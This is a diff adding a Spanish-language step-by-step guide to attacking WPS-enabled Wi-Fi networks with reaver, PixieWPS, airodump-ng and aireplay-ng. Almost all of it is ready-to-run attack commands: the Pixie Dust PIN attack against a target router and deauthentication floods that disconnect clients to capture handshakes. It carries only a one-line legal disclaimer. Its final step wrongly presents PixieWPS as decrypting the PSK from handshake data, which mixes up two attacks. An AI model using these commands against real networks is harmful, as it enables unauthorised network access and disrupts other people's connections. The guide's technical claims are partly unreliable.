@@ -1,0 +1,129 @@
+# **Guía para Capturar el PSK y el PIN usando PixieWPS**
+
+## **Preparación del Entorno**
+
+### **Instalar las Herramientas Necesarias**
+```bash
+sudo apt-get update
+sudo apt-get install reaver pixiewps aircrack-ng
+```
+
+### **Colocar la Interfaz Wi-Fi en Modo Monitor**
+```bash
+sudo ifconfig wlan0 down
+sudo iwconfig wlan0 mode monitor
+sudo ifconfig wlan0 up
+```
+
+---
+
+## **Identificar la Red Objetivo**
+
+### **Usar `airodump-ng` para identificar redes disponibles**
+```bash
+sudo airodump-ng wlan0
+```
+- **Nota:** Anota el BSSID y el canal (CH) de la red objetivo.
+
+---
+
+## **Iniciar el Ataque con Reaver y PixieWPS**
+
+### **1. Capturar los Datos Necesarios usando Reaver**
+```bash
+sudo reaver -i wlan0 -b <BSSID_del_enrutador> -c <canal> -K 1 -vv
+```
+- **Descripción de parámetros:**
+    - `-i wlan0`: Especifica la interfaz Wi-Fi.
+    - `-b <BSSID_del_enrutador>`: Dirección MAC del enrutador objetivo.
+    - `-c <canal>`: Canal de la red Wi-Fi.
+    - `-K 1`: Activa el ataque PixieDust.
+    - `-vv`: Modo verboso para obtener más detalles en la salida.
+
+### **2. Reaver se ejecutará automáticamente y tratará de calcular el PIN usando PixieWPS**
+
+---
+
+## **Usar PixieWPS Manualmente (Opcional)**
+
+### **1. Capturar el Handshake WPA/WPA2**
+- Usar herramientas como `airodump-ng` y `aireplay-ng` para capturar el handshake (ver sección correspondiente en las guías de Reaver y Bully).
+
+### **2. Analizar los Datos Capturados con PixieWPS**
+- Si ya tienes los datos necesarios capturados (p. ej., PKE, PKR, E-Hash1, E-Hash2, AuthKey, etc.), puedes usar PixieWPS manualmente:
+    ```bash
+    pixiewps -e <PKE> -r <PKR> -s <E-Hash1> -z <E-Hash2> -a <AuthKey> -n <Enonce>
+    ```
+    - **Parámetros:**
+        - `-e <PKE>`: Public Key Enrollee.
+        - `-r <PKR>`: Public Key Registrar.
+        - `-s <E-Hash1>`: E-Hash1.
+        - `-z <E-Hash2>`: E-Hash2.
+        - `-a <AuthKey>`: AuthKey.
+        - `-n <Enonce>`: E-Nonce.
+
+---
+
+## **Capturar el PSK (Pre-Shared Key)**
+
+### **Pasos para Capturar el Handshake WPA/WPA2**
+
+#### **1. Capturar el Handshake usando `airodump-ng`**
+- Ejecutar `airodump-ng` en el canal de la red objetivo para capturar el handshake:
+    ```bash
+    sudo airodump-ng -c <canal> --bssid <BSSID_del_enrutador> -w captura wlan0
+    ```
+
+#### **2. Forzar la desconexión de un cliente para capturar el handshake usando `aireplay-ng`**
+- Identificar un cliente conectado (STA) en la red objetivo.
+- Enviar paquetes de deautenticación para forzar la reconexión y capturar el handshake:
+    ```bash
+    sudo aireplay-ng -0 10 -a <BSSID_del_enrutador> -c <MAC_del_cliente> wlan0
+    ```
+    - **Parámetros:**
+        - `-0 10`: Enviar 10 paquetes de deautenticación.
+        - `-a <BSSID_del_enrutador>`: Dirección MAC del enrutador.
+        - `-c <MAC_del_cliente>`: Dirección MAC del cliente.
+
+#### **3. Verificar si se ha capturado el handshake**
+- Usar `aircrack-ng` para verificar la captura:
+    ```bash
+    sudo aircrack-ng captura-01.cap
+    ```
+
+---
+
+## **Ejemplo Completo de Uso con PixieWPS**
+
+### **1. Colocar la interfaz en modo monitor**
+```bash
+sudo ifconfig wlan0 down
+sudo iwconfig wlan0 mode monitor
+sudo ifconfig wlan0 up
+```
+
+### **2. Identificar redes Wi-Fi vulnerables**
+```bash
+sudo airodump-ng wlan0
+```
+
+### **3. Iniciar Reaver con PixieDust**
+```bash
+sudo reaver -i wlan0 -b <BSSID_del_enrutador> -c <canal> -K 1 -vv
+```
+
+### **4. Capturar el handshake**
+```bash
+sudo airodump-ng -c <canal> --bssid <BSSID_del_enrutador> -w captura wlan0
+sudo aireplay-ng -0 10 -a <BSSID_del_enrutador> -c <MAC_del_cliente> wlan0
+sudo aircrack-ng captura-01.cap
+```
+
+### **5. Desencriptar el PSK usando los datos capturados con PixieWPS**
+```bash
+pixiewps -e <PKE> -r <PKR> -s <E-Hash1> -z <E-Hash2> -a <AuthKey> -n <Enonce>
+```
+
+---
+
+Siguiendo estos pasos, podrás capturar tanto el PIN como el PSK de una red Wi-Fi con WPS habilitado, siempre dentro del marco legal y ético correspondiente.
